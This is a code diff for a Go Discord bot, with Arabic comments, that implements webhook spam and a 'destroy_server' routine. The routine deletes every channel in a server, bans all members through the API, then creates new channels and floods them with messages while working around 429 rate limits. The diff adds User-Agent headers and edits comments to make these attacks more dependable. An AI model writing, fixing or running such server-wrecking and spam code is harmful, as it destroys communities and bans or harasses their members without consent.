@@ -31,7 +31,6 @@ func main() {
 		return
 	}
 
-	// تفعيل الـ Intents المطلوبة بالكامل بما فيها الإشراف والأعضاء
 	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsGuildModeration | discordgo.IntentsGuildMessages
 
 	cmdWhSpam := "wh_spam"
@@ -206,6 +205,7 @@ func createFiveWebhooks(token, channelID, webhookName string) []string {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
+		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
 	var activeURLs []string
@@ -250,6 +250,7 @@ func createFiveWebhooks(token, channelID, webhookName string) []string {
 func deleteFiveWebhooks(token string, urls []string) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
+		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
 	var wg sync.WaitGroup
@@ -299,6 +300,7 @@ func burstSendFast(urls []string, messageContent string, sentCounter *int, total
 				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 				req, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
 				req.Header.Set("Content-Type", "application/json")
+				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
 
 				resp, err := httpClient.Do(req)
 				if err != nil {
@@ -327,17 +329,14 @@ func burstSendFast(urls []string, messageContent string, sentCounter *int, total
 	wg.Wait()
 }
 
-// ==========================================
-// أمر التدمير (destroy_server) بعد الإصلاح الشامل
-// ==========================================
-
 func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
+		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	// 1. حذف الرومات الحالية
+	// 1. حذف الرومات الحالية بشكل مضمون
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -371,7 +370,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		wgDel.Wait()
 	}()
 
-	// 2. جلب الأعضاء وتبنيدهم بشكل منظم
+	// 2. جلب الأعضاء عبر API مباشرة وتبنيدهم بدون أخطاء
 	go func() {
 		var userIDs []string
 		after := ""
@@ -400,7 +399,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		wgBan.Wait()
 	}()
 
-	// 3. إنشاء الرومات الجديدة والسبام فيها بالعدد الكامل وبدون ضياع رسائل
+	// 3. إنشاء الرومات الجديدة والسبام فيها بالعدد الكامل
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -437,7 +436,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 	}
 	wgCreate.Wait()
 
-	// إرسال الرسائل بالكامل لكل روم تم إنشاؤه مع تحكم بالسرعة لمنع أخطاء 429
 	var wgMsg sync.WaitGroup
 	for _, chID := range channelIDs {
 		wgMsg.Add(1)
@@ -455,12 +453,12 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 					if msgResp.StatusCode == 429 {
 						msgResp.Body.Close()
 						time.Sleep(100 * time.Millisecond)
-						m-- // إعادة محاولة الإرسال في حال الـ Rate Limit
+						m--
 						continue
 					}
 					msgResp.Body.Close()
 				}
-				time.Sleep(15 * time.Millisecond) // تأحير بسيط جداً لتنظيم التدفق وضمان وصول العدد كامل
+				time.Sleep(15 * time.Millisecond)
 			}
 		}(chID)
 	}
